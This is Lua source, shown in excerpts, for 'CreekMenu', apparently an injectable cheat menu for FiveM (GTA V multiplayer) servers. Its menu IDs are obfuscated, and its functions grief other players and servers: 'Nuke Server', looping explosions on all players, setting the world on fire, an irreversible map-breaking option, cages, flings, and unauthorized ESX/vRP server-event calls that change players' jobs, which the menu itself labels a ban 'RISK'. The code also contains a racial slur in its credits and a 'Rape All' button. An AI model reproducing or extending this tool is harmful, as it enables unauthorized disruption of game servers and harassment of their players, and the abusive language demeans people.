...
Citizen.CreateThread(function()
	while true do
		...
		SetDiscordAppId(732722795850760253)

		SetDiscordRichPresenceAsset('ROLLESPILLEREN PÅ YOUTUBE')
        ...
        SetDiscordRichPresenceAssetSmallText('Phan#0002')
...
local function debugPrint(text)
    if CreekMenu.debug then
        Citizen.Trace('[CreekMenu] ' .. tostring(text))
    end
end
...
function CreekMenu.CreateMenu(id, title)
    menus[id] = {}
...
function CreekMenu.CreateSubMenu(id, parent, subTitle)
    if menus[parent] then
        CreekMenu.CreateMenu(id, menus[parent].title)
        if subTitle then
...
function CreekMenu.CurrentMenu()
    return currentMenu
end

function CreekMenu.OpenMenu(id)
    if id and menus[id] then
...
function CreekMenu.IsMenuOpened(id)
    return isMenuVisible(id)
end

function CreekMenu.IsAnyMenuOpened()
...
function CreekMenu.IsMenuAboutToBeClosed()
    if menus[currentMenu] then
...
function CreekMenu.Button(text, subText)
...
function CreekMenu.MenuButton(text, id)
    if menus[id] then
        if CreekMenu.Button(text .. themecolor .. "   " .. themearrow) then
            setMenuVisible(currentMenu, arwet)
...
function CreekMenu.CheckBox(text, checked, offtext, ontext, callback)
    if not offtext then
        offtext = "Off"
    end
    ...
    if CreekMenu.Button(text, checked and ontext or offtext) then
        checked = not checked
...
function CreekMenu.ComboBox(text, items, currentIndex, selectedIndex, callback)
    ...
    if CreekMenu.Button(text, selectedItem) then
...
function CreekMenu.SetMenuWidth(id, width)
    setMenuProperty(id, 'width', width)
end

function CreekMenu.SetMenuX(id, x)
    setMenuProperty(id, 'x', x)
end

function CreekMenu.SetMenuY(id, y)
    setMenuProperty(id, 'y', y)
end

function CreekMenu.SetMenuMaxOptionCountOnScreen(id, count)
    setMenuProperty(id, 'maxOptionCount', count)
end

function CreekMenu.SetTitle(id, title)
    setMenuProperty(id, 'title', title)
end

function CreekMenu.SetTitleColor(id, r, g, b, a)
    setMenuProperty(id, 'titleColor', {['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or menus[id].titleColor.a})
end

function CreekMenu.SetTitleBackgroundColor(id, r, g, b, a)
    setMenuProperty(id, 'titleBackgroundColor', {['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or menus[id].titleBackgroundColor.a})
end

function CreekMenu.SetTitleBackgroundSprite(id, textureDict, textureName)
    RequestStreamedTextureDict(textureDict)
    setMenuProperty(id, 'titleBackgroundSprite', {dict = textureDict, name = textureName})
end

function CreekMenu.SetSubTitle(id, text)
    setMenuProperty(id, 'subTitle', string.upper(text))
end

function CreekMenu.SetMenuBackgroundColor(id, r, g, b, a)
    setMenuProperty(id, 'menuBackgroundColor', {['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or menus[id].menuBackgroundColor.a})
end

function CreekMenu.SetMenuTextColor(id, r, g, b, a)
    setMenuProperty(id, 'menuTextColor', {['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or menus[id].menuTextColor.a})
end

function CreekMenu.SetMenuSubTextColor(id, r, g, b, a)
    setMenuProperty(id, 'menuSubTextColor', {['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or menus[id].menuSubTextColor.a})
end

function CreekMenu.SetMenuFocusColor(id, r, g, b, a)
    setMenuProperty(id, 'menuFocusColor', {['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or menus[id].menuFocusColor.a})
end

function CreekMenu.SetMenuButtonPressedSound(id, name, set)
...
developers = {
    "~r~Phan#0002 - ~b~MA NIGGA",
}

menuName = "~s~                                           "
version = ""
theme = "infamous"
themes = {"infamous", "basic", "dark", "CreekMenu"}
mpMessage = arwet
menuKeybind = "F6"
menuKeybind2 = "F6"
noclipKeybind = "PAGEUP"
teleportKeyblind = "F2"
startMessage = "CreekMenu ~n~~r~Injected Complete"
subMessage = "~n~~s~PRESS ~r~F6"
motd2 = "PRESS ~r~*" ..teleportKeyblind.."* ~w~TO TELEPORT TO WAYPOINT"
motd = "PRESS ~r~*" ..noclipKeybind.."* ~w~TO ACTIVATE NOCLIP!"
motd3 = "Phan#0002 ~n~~r~https://discord.gg/Zm9jg9q"
...
function CreekMenu.SetFont(id, font)
    buttonFont = font
    menus[id].titleFont = font
end

function CreekMenu.SetMenuFocusBackgroundColor(id, r, g, b, a)
    setMenuProperty(id, "menuFocusBackgroundColor", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuFocusBackgroundColor.a})
end

function CreekMenu.SetMaxOptionCount(id, count)
    setMenuProperty(id, 'maxOptionCount', count)
end

function CreekMenu.PopupWindow(x, y, title)

end


function CreekMenu.SetTheme(id, theme)
    if theme == "basic" then
        CreekMenu.SetMenuBackgroundColor(id, 81, 231, 251, 125)
        CreekMenu.SetTitleBackgroundColor(id, 92, 212, 249, 80)
        CreekMenu.SetTitleColor(id, 92, 212, 249, 230)
        CreekMenu.SetMenuSubTextColor(id, 255, 255, 255, 230)
        CreekMenu.SetMenuFocusColor(id, 40, 40, 40, 230)
        CreekMenu.SetFont(id, 7)
        CreekMenu.SetMenuX(id, .75)-- [0.0..1.0] top left corner
        CreekMenu.SetMenuY(id, .1)-- [0.0..1.0] top
        CreekMenu.SetMenuWidth(id, 0.23)-- 0.23
        CreekMenu.SetMaxOptionCount(id, 12)-- 10
    ...
    elseif theme == "dark" then
        CreekMenu.SetMenuBackgroundColor(id, 180, 80, 80, 255)
        CreekMenu.SetTitleBackgroundColor(id, 180, 80, 80, 255)
        CreekMenu.SetTitleColor(id, 180, 80, 80, 230)
        CreekMenu.SetMenuSubTextColor(id, 255, 255, 255, 230)
        CreekMenu.SetMenuFocusColor(id, 40, 40, 40, 255)
        CreekMenu.SetFont(id, 1)
        CreekMenu.SetMenuX(id, .75)
        CreekMenu.SetMenuY(id, .1)
        CreekMenu.SetMenuWidth(id, 0.23)-- 0.23
        CreekMenu.SetMaxOptionCount(id, 12)-- 10
        ...
        themecolor = '~r~'
        themearrow = ">"
    elseif theme == "CreekMenu" then
        CreekMenu.SetMenuBackgroundColor(id, 50, 50, 160, 85)
        CreekMenu.SetTitleBackgroundColor(id, 92, 255, 0, 255)
        CreekMenu.SetTitleColor(id, 92, 212, 249, 170)
        CreekMenu.SetMenuSubTextColor(id, 255, 255, 255, 230)
        CreekMenu.SetFont(id, 0)
        CreekMenu.SetMenuX(id, .75)
        CreekMenu.SetMenuY(id, .1)
        CreekMenu.SetMenuWidth(id, 0.23)-- 0.23
        CreekMenu.SetMaxOptionCount(id, 12)-- 10
    ...
    elseif theme == "infamous" then
        CreekMenu.SetMenuBackgroundColor(id, 38, 38, 38, 255)
        CreekMenu.SetTitleBackgroundColor(id, 150, 38, 38, 255)
        CreekMenu.SetTitleColor(id, 150, 38, 38, 255)
        CreekMenu.SetMenuSubTextColor(id, 150, 38, 38, 255)
        CreekMenu.SetMenuFocusBackgroundColor(id, 110, 38, 38, 255)
        CreekMenu.SetFont(id, 4)
        CreekMenu.SetMenuX(id, .725)
        CreekMenu.SetMenuY(id, .1)
        CreekMenu.SetMenuWidth(id, 0.25)-- 0.23
        CreekMenu.SetMaxOptionCount(id, 13)-- 10
...
function CreekMenu.InitializeTheme()
    for i = 1, #menulist do
        CreekMenu.SetTheme(menulist[i], theme)
    end
end

-- ComboBox w/ new index behaviour (does not wrap around)
function CreekMenu.ComboBox2(text, items, currentIndex, selectedIndex, callback)
	local itemsCount = #items
	local selectedItem = items[currentIndex]
	local isCurrent = menus[currentMenu].currentOption == (optionCount + 1)
...
function CreekMenu.ComboBoxSlider(text, items, currentIndex, selectedIndex, callback)
	local itemsCount = #items
	local selectedItem = items[currentIndex]
	local isCurrent = menus[currentMenu].currentOption == (optionCount + 1)
	...
	if CreekMenu.Button2(text, items, itemsCount, currentIndex) then
		selectedIndex = currentIndex
		callback(currentIndex, selectedIndex)
		return true
	elseif isCurrent then
...
function CreekMenu.Button2(text, items, itemsCount, currentIndex)
	local buttonText = text
...
Citizen.CreateThread(function()
    local p = 1
    while true do
        if theme == "CreekMenu" then -- static effect for CreekMenu theme - https://github.com/esc0rtd3w/illicit-sprx/blob/master/main/illicit/textures.h
            if p == 5 then p = 1 else p = p + 1 end
            for i = 1, #menulist do
                if CreekMenu.IsMenuOpened(menulist[i]) then CreekMenu.SetTitleBackgroundSprite(menulist[i], 'digitaloverlay', 'static' .. p) end
            end
        else -- Base textures
            for i = 1, #menulist do CreekMenu.SetTitleBackgroundSprite(menulist[i], 'mpinventory', 'darts') end
        end
        Wait(100)
    end
end)
...
Citizen.CreateThread(function()
    ...
    -- MAIN MENU
    CreekMenu.CreateMenu('CreekMenu', menuName .. '' .. version)
    CreekMenu.SetSubTitle('CreekMenu', '~s~                                                         CreekMenu')

    -- MAIN MENU SUBMENUS
    CreekMenu.CreateSubMenu('\112\108\97\121\101\114\10', 'CreekMenu', 'Player Options')
    CreekMenu.CreateSubMenu('\115\101\108\102\10', 'CreekMenu', 'Self Options')
    CreekMenu.CreateSubMenu('\119\101\97\112\111\110\10', 'CreekMenu', 'Weapon Options')
    CreekMenu.CreateSubMenu('\118\101\104\105\99\108\101\10', 'CreekMenu', 'Vehicle Options')
    CreekMenu.CreateSubMenu('\119\111\114\108\100\10', 'CreekMenu', 'World Options')
	CreekMenu.CreateSubMenu('\116\101\108\101\112\111\114\116\10', 'CreekMenu', 'Teleport Options')
    CreekMenu.CreateSubMenu('\109\105\115\99\10', 'CreekMenu', 'Misc Options')
    CreekMenu.CreateSubMenu('\108\117\97\10', 'CreekMenu', 'Lua Options')
    CreekMenu.CreateSubMenu('\115\101\116\116\105\110\103\115\10', 'CreekMenu', '\115\101\116\116\105\110\103\115\10')
    CreekMenu.CreateSubMenu('\108\121\110\120\10', 'CreekMenu', '\108\121\110\120\10 bro....')
    -- PLAYER MENU SUBMENUS
    CreekMenu.CreateSubMenu('allplayer', '\112\108\97\121\101\114\10', 'All Players')
    CreekMenu.CreateSubMenu('\112\108\97\121\101\114\111\112\116\105\111\110\115\10', '\112\108\97\121\101\114\10', 'Player Options')
    CreekMenu.CreateSubMenu('troll', '\112\108\97\121\101\114\111\112\116\105\111\110\115\10', 'Troll Options')
    CreekMenu.CreateSubMenu('jobsplayers', '\112\108\97\121\101\114\111\112\116\105\111\110\115\10', 'Jobs Options')
    CreekMenu.CreateSubMenu('jobsplayers2', '\112\108\97\121\101\114\111\112\116\105\111\110\115\10', 'Jobs Options')


    -- SELF MENU SUBMENUS
    CreekMenu.CreateSubMenu('\97\112\112\101\97\114\97\110\99\101\10', 'CreekMenu', 'Appearance Options')
    CreekMenu.CreateSubMenu('modifiers', '\115\101\108\102\10', 'Modifiers Options')

	-- APPEARANCE SUBMENUS
	CreekMenu.CreateSubMenu('modifyskintextures', '\97\112\112\101\97\114\97\110\99\101\10', "Modify Skin Textures")
    CreekMenu.CreateSubMenu('modifyhead', 'modifyskintextures', "Available Drawables")
	CreekMenu.CreateSubMenu('skinsmodels', '\97\112\112\101\97\114\97\110\99\101\10', "Skin Models")

    -- WEAPON MENU SUBMENUS

	CreekMenu.CreateSubMenu('WeaponCustomization', '\119\101\97\112\111\110\10', 'Weapon Customization')
    CreekMenu.CreateSubMenu('\119\101\97\112\111\110\115\112\97\119\110\101\114\10', '\119\101\97\112\111\110\10', 'Weapon Spawner')
    CreekMenu.CreateSubMenu('melee', '\119\101\97\112\111\110\115\112\97\119\110\101\114\10', 'Melee Weapons')
    CreekMenu.CreateSubMenu('pistol', '\119\101\97\112\111\110\115\112\97\119\110\101\114\10', 'Pistols')
    CreekMenu.CreateSubMenu('smg', '\119\101\97\112\111\110\115\112\97\119\110\101\114\10', 'SMGs / MGs')
    CreekMenu.CreateSubMenu('shotgun', '\119\101\97\112\111\110\115\112\97\119\110\101\114\10', 'Shotguns')
    CreekMenu.CreateSubMenu('assault', '\119\101\97\112\111\110\115\112\97\119\110\101\114\10', 'Assault Rifles')
    CreekMenu.CreateSubMenu('sniper', '\119\101\97\112\111\110\115\112\97\119\110\101\114\10', 'Sniper Rifles')
    CreekMenu.CreateSubMenu('thrown', '\119\101\97\112\111\110\115\112\97\119\110\101\114\10', 'Thrown Weapons')
    CreekMenu.CreateSubMenu('heavy', '\119\101\97\112\111\110\115\112\97\119\110\101\114\10', 'Heavy Weapons')

    -- VEHICLE MENU SUBMENUS
    CreekMenu.CreateSubMenu('\118\101\104\105\99\108\101\115\112\97\119\110\101\114\10', '\118\101\104\105\99\108\101\10', 'Vehicle Spawner')
    CreekMenu.CreateSubMenu('vehiclemods', '\118\101\104\105\99\108\101\10', 'Vehicle Mods')
    CreekMenu.CreateSubMenu('vehiclemenu', '\118\101\104\105\99\108\101\10', 'Vehicle Control Menu')

    -- VEHICLE SPAWNER MENU
    CreekMenu.CreateSubMenu('compacts', '\118\101\104\105\99\108\101\115\112\97\119\110\101\114\10', 'Compacts')
    CreekMenu.CreateSubMenu('sedans', '\118\101\104\105\99\108\101\115\112\97\119\110\101\114\10', 'Sedans')
    CreekMenu.CreateSubMenu('suvs', '\118\101\104\105\99\108\101\115\112\97\119\110\101\114\10', 'SUVs')
    CreekMenu.CreateSubMenu('coupes', '\118\101\104\105\99\108\101\115\112\97\119\110\101\114\10', 'Coupes')
    CreekMenu.CreateSubMenu('muscle', '\118\101\104\105\99\108\101\115\112\97\119\110\101\114\10', 'Muscle')
    CreekMenu.CreateSubMenu('sportsclassics', '\118\101\104\105\99\108\101\115\112\97\119\110\101\114\10', 'Sports Classics')
    CreekMenu.CreateSubMenu('sports', '\118\101\104\105\99\108\101\115\112\97\119\110\101\114\10', 'Sports')
    CreekMenu.CreateSubMenu('super', '\118\101\104\105\99\108\101\115\112\97\119\110\101\114\10', 'Super')
    CreekMenu.CreateSubMenu('motorcycles', '\118\101\104\105\99\108\101\115\112\97\119\110\101\114\10', 'Motorcycles')
    CreekMenu.CreateSubMenu('offroad', '\118\101\104\105\99\108\101\115\112\97\119\110\101\114\10', 'Off-Road')
    CreekMenu.CreateSubMenu('industrial', '\118\101\104\105\99\108\101\115\112\97\119\110\101\114\10', 'Industrial')
    CreekMenu.CreateSubMenu('utility', '\118\101\104\105\99\108\101\115\112\97\119\110\101\114\10', 'Utility')
    CreekMenu.CreateSubMenu('vans', '\118\101\104\105\99\108\101\115\112\97\119\110\101\114\10', 'Vans')
    CreekMenu.CreateSubMenu('cycles', '\118\101\104\105\99\108\101\115\112\97\119\110\101\114\10', 'Cycles')
    CreekMenu.CreateSubMenu('boats', '\118\101\104\105\99\108\101\115\112\97\119\110\101\114\10', 'Boats')
    CreekMenu.CreateSubMenu('helicopters', '\118\101\104\105\99\108\101\115\112\97\119\110\101\114\10', 'Helicopters')
    CreekMenu.CreateSubMenu('planes', '\118\101\104\105\99\108\101\115\112\97\119\110\101\114\10', 'Planes')
    CreekMenu.CreateSubMenu('service', '\118\101\104\105\99\108\101\115\112\97\119\110\101\114\10', 'Service')
    CreekMenu.CreateSubMenu('commercial', '\118\101\104\105\99\108\101\115\112\97\119\110\101\114\10', 'Commercial')

    -- VEHICLE MODS SUBMENUS
    CreekMenu.CreateSubMenu('vehiclecolors', 'vehiclemods', 'Vehicle Colors')
    CreekMenu.CreateSubMenu('vehiclecolors_primary', 'vehiclecolors', 'Primary Color')
    CreekMenu.CreateSubMenu('vehiclecolors_secondary', 'vehiclecolors', 'Secondary Color')

    CreekMenu.CreateSubMenu('primary_classic', 'vehiclecolors_primary', 'Classic Colors')
    CreekMenu.CreateSubMenu('primary_matte', 'vehiclecolors_primary', 'Matte Colors')
    CreekMenu.CreateSubMenu('primary_metal', 'vehiclecolors_primary', 'Metals')

    CreekMenu.CreateSubMenu('secondary_classic', 'vehiclecolors_secondary', 'Classic Colors')
    CreekMenu.CreateSubMenu('secondary_matte', 'vehiclecolors_secondary', 'Matte Colors')
    CreekMenu.CreateSubMenu('secondary_metal', 'vehiclecolors_secondary', 'Metals')

    CreekMenu.CreateSubMenu('vehicletuning', 'vehiclemods', 'Vehicle Tuning')

    -- WORLD MENU SUBMENUS
    CreekMenu.CreateSubMenu('\111\98\106\101\99\116\115\112\97\119\110\101\114\10', 'CreekMenu', 'Object Spawner')
    CreekMenu.CreateSubMenu('objectlist', '\111\98\106\101\99\116\115\112\97\119\110\101\114\10', 'Select To Delete')
    CreekMenu.CreateSubMenu('weather', '\119\111\114\108\100\10', 'Weather Changer | ~r~Client Side')
    CreekMenu.CreateSubMenu('time', '\119\111\114\108\100\10', 'Time Changer')

    -- MISC MENU SUBMENUS
	CreekMenu.CreateSubMenu('esp', '\109\105\115\99\10', 'ESP & Visual Options')
	CreekMenu.CreateSubMenu('webradio', '\109\105\115\99\10', 'Web Radio')
    CreekMenu.CreateSubMenu('credits', '\109\105\115\99\10', 'Credits')
    CreekMenu.CreateSubMenu('InfoMenu', '\109\105\115\99\10', 'Info')

    -- TELEPORT MENU SUBMENUS
    CreekMenu.CreateSubMenu('saveload', '\116\101\108\101\112\111\114\116\10', 'Tøjbutikker')
    CreekMenu.CreateSubMenu('pois', '\116\101\108\101\112\111\114\116\10', 'Garager')
    CreekMenu.CreateSubMenu('pois2', '\116\101\108\101\112\111\114\116\10', 'Steder')

	--fuck server
	CreekMenu.CreateSubMenu('\102\117\99\107\115\101\114\118\101\114\10', 'CreekMenu', 'Fuck Server')

    -- LUA MENU SUBMENUS
    CreekMenu.CreateSubMenu('\101\115\120\10', '\108\117\97\10', 'ESX Options')
    CreekMenu.CreateSubMenu('\118\114\112\10', '\108\117\97\10', 'vRP Options')
    CreekMenu.CreateSubMenu('roles', '\108\117\97\10', 'vRP Rolespilleren')
    CreekMenu.CreateSubMenu('other', '\108\117\97\10', 'Esx Jobs')
    CreekMenu.CreateSubMenu('money', '\118\114\112\10', 'Money Options')

    CreekMenu.InitializeTheme()


    while true do
        -- MAIN MENU
        
        if CreekMenu.IsMenuOpened('CreekMenu') then
        	if CreekMenu.MenuButton('Self-Options', '\115\101\108\102\10') then
            elseif CreekMenu.MenuButton('Online Players', '\112\108\97\121\101\114\10') then
            elseif CreekMenu.MenuButton('LUA', '\108\117\97\10') then
            elseif CreekMenu.MenuButton('Weapons', '\119\101\97\112\111\110\10') then
           	elseif CreekMenu.MenuButton('Vehicles', '\118\101\104\105\99\108\101\10') then
			elseif CreekMenu.MenuButton('Models', '\97\112\112\101\97\114\97\110\99\101\10') then
            elseif CreekMenu.MenuButton('World', '\119\111\114\108\100\10') then
			elseif CreekMenu.MenuButton('Teleport', '\116\101\108\101\112\111\114\116\10') then
            elseif CreekMenu.MenuButton('Misc', '\109\105\115\99\10') then
			elseif CreekMenu.MenuButton('Objects', '\111\98\106\101\99\116\115\112\97\119\110\101\114\10') then
			elseif CreekMenu.MenuButton('RIP Server', '\102\117\99\107\115\101\114\118\101\114\10') then
            elseif CreekMenu.MenuButton('Options', '\115\101\116\116\105\110\103\115\10') then
            elseif CreekMenu.Button('Close Menu') then break
            end

        -- PLAYER OPTIONS MENU
        elseif CreekMenu.IsMenuOpened('\112\108\97\121\101\114\10') then

                local playerlist = GetActivePlayers()
                for i = 1, #playerlist do
                    local currPlayer = playerlist[i]
                    if CreekMenu.MenuButton("ID: ~r~[" .. GetPlayerServerId(currPlayer) .. "] ~s~" .. GetPlayerName(currPlayer), '\112\108\97\121\101\114\111\112\116\105\111\110\115\10') then
		...
		--Fuck server
		elseif CreekMenu.IsMenuOpened('\102\117\99\107\115\101\114\118\101\114\10') then
		    if CreekMenu.CheckBox("~s~Include Self", includeself, "No", "Yes") then
                includeself = not includeself
            elseif CreekMenu.Button("~s~Fake ~s~Chat Message") then 
            ...
            elseif CreekMenu.Button("~s~Nuke Server") then
			ShowInfo("~y~Fucking Players...")
                nukeserver()
            elseif CreekMenu.Button("~s~Rape All") then
                RapeAllFunc() 
            elseif CreekMenu.Button("~s~Change ~s~All Nearby Vehicles Plate Text") then
            local plateInput = GetKeyboardInput("Enter Plate Text (8 Characters):")
            for k in EnumerateVehicles() do
                RequestControlOnce(k)
                SetVehicleNumberPlateText(k, plateInput)
            end
			elseif CreekMenu.CheckBox("~s~Make ~s~All Cars ~r~Fly", FlyingCars) then
                FlyingCars = not FlyingCars
            elseif CreekMenu.CheckBox("~s~Set ~s~The World On ~r~Fire", WorldOnFire) then
			...
			elseif CreekMenu.Button("~s~Close ~s~The Whole Square") then
	...
	elseif CreekMenu.Button("~s~SPAWN ~r~Lion ~s~On All Players") then
		...
		elseif CreekMenu.Button("~s~SPAWN ~r~SWAT ~s~On All Players ") then
	 ...
	 elseif CreekMenu.Button('~s~Make All Players A Hamburger Head') then
                    local plist = GetActivePlayers()
                        for i = 0, #plist do
            ...
            elseif CreekMenu.Button("~s~Fuck Up The Map | Irreversible! | ~r~[WIP]") then
                if not FuckMap then
            ...
            elseif CreekMenu.Button("~s~Explode All Players") then
                ExplodeAll(includeself)
            elseif CreekMenu.CheckBox("~s~Explode All Players | ~r~LOOP", ExplodingAll) then
                ExplodingAll = not ExplodingAll
            elseif CreekMenu.Button("~s~Give All Players Weapons") then
                GiveAllPlayersWeapons(includeself)
            elseif CreekMenu.Button("~s~Remove All Players Weapons") then
                StripAll(includeself)
            elseif CreekMenu.Button("~s~FUCK ALL Vehicles") then
            elseif CreekMenu.Button("~s~Rampinator") then
            ...
            elseif CreekMenu.Button("~s~BORGAR~s~ Vehicles") then local cC = GetHashKey("xs_prop_hamburgher_wl") for vehicle in EnumerateVehicles() do local cD = CreateObject(cC, 0, 0, 0, true, true, true) AttachEntityToEntity(cD, vehicle, 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true) end 
            elseif CreekMenu.Button("Kick All Players From Vehicle") then
                KickAllFromVeh(includeself)
            end

        elseif CreekMenu.IsMenuOpened('jobsplayers2') then
        if CreekMenu.Button("Udløs Panik Knap", '~r~~r~Devo & Sky') then
        ...
        elseif CreekMenu.Button("Launch Players Vehicle") then
        ...
        elseif CreekMenu.ComboBox("Pop Players Vehicle Tire", {"Front Left", "Front Right", "Back Left", "Back Right", "All"}, currTireIndex, selTireIndex, function(currentIndex, selClothingIndex)
        ...
        elseif CreekMenu.Button("Slam Players Vehicle") then
            if not IsPedInAnyVehicle(GetPlayerPed(selectedPlayer), 0) then
                ShowInfo("~r~Player Not In Vehicle!")
            else
        ...
        elseif CreekMenu.ComboBox("Teleport Into Players Vehicle", {"Front Right", "Back Left", "Back Right"}, currSeatIndex, selSeatIndex, function(currentIndex, selClothingIndex)
        ...
        elseif CreekMenu.CheckBox("Track Player", Tracking, "Tracking: Nobody", "Tracking: "..GetPlayerName(TrackedPlayer)) then
            Tracking = not Tracking
            TrackedPlayer = selectedPlayer
        elseif CreekMenu.CheckBox("Fling Player", FlingingPlayer, "Flinging: Nobody", "Flinging: "..GetPlayerName(FlingedPlayer)) then
			...
			elseif CreekMenu.IsMenuOpened('jobsplayers') then
			if CreekMenu.Button("~s~Remove Job") then
                udwdj("NB:destituerplayer",GetPlayerServerId(selectedPlayer))
			elseif CreekMenu.Button("~s~Recruit~s~ Mechanic") then
			...
			elseif CreekMenu.Button("~s~Recruit~s~ Police") then
			local result = GetKeyboardInput("Enter Nivel Job ~r~0-10", "", 10)
			...
			elseif CreekMenu.Button("~s~Recruit~s~ Mafia") then
			local result = GetKeyboardInput("Enter Nivel Job ~r~0-10", "", 10)
			...
			elseif CreekMenu.Button("~s~Recruit~s~ Gang") then
			local result = GetKeyboardInput("Enter Nivel Job ~r~0-10", "", 10)
			...
			elseif CreekMenu.Button("~s~Recruit~s~ Taxi") then
			local result = GetKeyboardInput("Enter Nivel Job ~r~0-10", "", 10)
			...
			elseif CreekMenu.Button("~s~Recruit~s~ Inem") then
			local result = GetKeyboardInput("Enter Nivel Job ~r~0-10", "", 10)
			 ...
			 elseif CreekMenu.IsMenuOpened('troll') then
			 if CreekMenu.Button('~r~Attack ~s~Windmill') then
					...
					elseif CreekMenu.Button('~r~Attack ~s~Weed Plant') then
		 local bI = CreateObject(GetHashKey('Prop_weed_01'), 0, 0, 0, true, true, true)
			 ...
			 elseif CreekMenu.Button('~r~Attack ~s~Giant Orange') then
			 ...
			 elseif CreekMenu.Button('~r~Cage ~s~Player') then
                    x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(selectedPlayer)))
                    roundx = tonumber(string.format('%.2f', x))
                    roundy = tonumber(string.format('%.2f', y))
                    roundz = tonumber(string.format('%.2f', z))
			...
			elseif CreekMenu.Button("~r~SPAWN ~s~SWAT ARMY WITH ~r~AK") then
			...
			elseif CreekMenu.Button("~r~SPAWN ~s~STRIPPER ARMY WITH ~r~RPG") then
			...
			elseif CreekMenu.Button("Nearby Peds Attack Player") then
                PedAttack(selectedPlayer, PedAttackType)
            elseif CreekMenu.ComboBox("Ped Attack Type", PedAttackOps, currAttackTypeIndex, selAttackTypeIndex, function(currentIndex, selectedIndex)
                currAttackTypeIndex = currentIndex
                selAttackTypeIndex = currentIndex
                PedAttackType = currentIndex
            end) then
			 elseif CreekMenu.Button("Possess Player Vehicle") then
                if Spectating then SpectatePlayer(selectedPlayer) end
                PossessVehicle(selectedPlayer)

            elseif CreekMenu.Button("Explode Player") then
                ExplodePlayer(selectedPlayer)
			elseif CreekMenu.Button("Silent Kill Player") then
				local coords = GetEntityCoords(GetPlayerPed(selectedPlayer))
                AddExplosion(coords.x, coords.y, coords.z, 4, 0.1, 0, 1, 0.0)
			elseif CreekMenu.Button("Kick From Vehicle") then
                KickFromVeh(selectedPlayer)
				end


        -- SPECIFIC PLAYER OPTIONS
        elseif CreekMenu.IsMenuOpened('\112\108\97\121\101\114\111\112\116\105\111\110\115\10') then
            if CreekMenu.Button("~s~PLAYER: " .. "~r~[" .. GetPlayerServerId(selectedPlayer) .. "] ~s~" .. GetPlayerName(selectedPlayer)) then
			elseif CreekMenu.CheckBox("~s~Spectate ~s~Player", Spectating, "Spectating: ~r~OFF", "Spectating: "..GetPlayerName(SpectatedPlayer)) then
				Spectating = not Spectating
				SpectatePlayer(selectedPlayer)
				SpectatedPlayer = selectedPlayer
            elseif CreekMenu.MenuButton("Troll Menu", 'troll') then
            elseif CreekMenu.MenuButton("~r~Custom ~s~| Troll Menu", 'jobsplayers2') then
            elseif CreekMenu.MenuButton("~r~ESX ~s~| ~s~Jobs Menu | ~r~RISK", 'jobsplayers') then
			elseif CreekMenu.Button("~r~ESX ~s~| ~s~Revive | ~r~RISK") then
			...
			elseif CreekMenu.Button('~r~vRP ~s~ | ~s~Revive') then
                    local bK = GetEntityCoords(GetPlayerPed(selectedPlayer))
            ...
            elseif CreekMenu.Button('~r~Both ~s~| ~s~Armour ~s~Player') then
                    local bK = GetEntityCoords(GetPlayerPed(selectedPlayer))
                    ...
                    SetPickupRegenerationTime(pickup, 60)
            elseif CreekMenu.Button('~r~Both ~s~| ~s~Full Armour ~s~Player') then
                    local bK = GetEntityCoords(GetPlayerPed(selectedPlayer))
                    for i = 0, 99 do
                        Citizen.Wait(0)
            ...
            elseif CreekMenu.Button("Cancel Animation/Task") then
                ClearPedTasksImmediately(GetPlayerPed(selectedPlayer))
            elseif CreekMenu.Button("Give All Weapons") then
            GiveAllWeapons(selectedPlayer)
            elseif CreekMenu.Button("Remove All Weapons") then
                StripPlayer(selectedPlayer)
            end


        -- SELF OPTIONS MENU
        elseif CreekMenu.IsMenuOpened('\115\101\108\102\10') then
            if CreekMenu.CheckBox("~s~God~s~Mode", Godmode) then
                Godmode = not Godmode
                ToggleGodmode(Godmode)
            elseif CreekMenu.CheckBox("Demi-God Mode", Demigod) then
                Demigod = not Demigod
			elseif CreekMenu.Button("~r~ESX | ~s~Revive | ~r~RISK") then
				local confirm = GetKeyboardInput("Using This Option Will ~r~Risk Banned ~s~Server! Are you Sure? ~r~Y~w~/~r~N")
			 if string.lower(confirm) == "y" then
            ...
            elseif CreekMenu.Button('~r~ESX | ~s~Revive Friend | ~r~RISK') then
            ...
            elseif CreekMenu.ComboBox("~s~Player ~s~Functions", {"~r~vRP ~s~Revive", "~s~Give Player Armor", "~s~Remove Player Armor", "~s~Clean Player", "~s~Suicide", "~s~Cancel Anim/Task"}, currPFuncIndex, selPFuncIndex, function(currentIndex, selClothingIndex)
            ...
            elseif CreekMenu.ComboBoxSlider("~s~Fast Run", FastCBWords, currFastRunIndex, selFastRunIndex, function(currentIndex, selClothingIndex)
			...
			elseif CreekMenu.ComboBoxSlider("~s~Fast Swim", FastCBWords, currFastSwimIndex, selFastSwimIndex, function(currentIndex, selClothingIndex)
            ...
            elseif CreekMenu.CheckBox("Super Jump", SuperJump) then
                SuperJump = not SuperJump
            elseif CreekMenu.CheckBox("Invisibility", Invisibility) then
                Invisibility = not Invisibility
                if not Invisibility then
                    SetEntityVisible(PlayerPedId(), true)
                end
            elseif CreekMenu.CheckBox("~s~Magneto Mode ~s~KEY | ~r~[E]", ForceTog) then
                ForceMod()
            elseif CreekMenu.CheckBox("~s~Forcefield", Forcefield) then
                Forcefield = not Forcefield
			elseif CreekMenu.ComboBox("~s~Forcefield Radius | ~r~CHANGEABLE", ForcefieldRadiusOps, currForcefieldRadiusIndex, selForcefieldRadiusIndex, function(currentIndex, selectedIndex)
            ...
            elseif CreekMenu.CheckBox("~s~Noclip", Noclipping) then
                ToggleNoclip()
			elseif CreekMenu.ComboBox("~s~Noclip Speed | ~r~CHANGEABLE", NoclipSpeedOps, currNoclipSpeedIndex, selNoclipSpeedIndex, function(currentIndex, selectedIndex)
        ...
        -- APPEARANCE MENU
        elseif CreekMenu.IsMenuOpened('\97\112\112\101\97\114\97\110\99\101\10') then
		if CreekMenu.MenuButton("Models", 'skinsmodels') then
            elseif CreekMenu.Button("Set Model Name") then
            ...
            elseif CreekMenu.MenuButton("Modify Skin Textures", 'modifyskintextures') then
            elseif CreekMenu.Button("~s~Randomize ~s~Model") then
                RandomClothes(PlayerId())
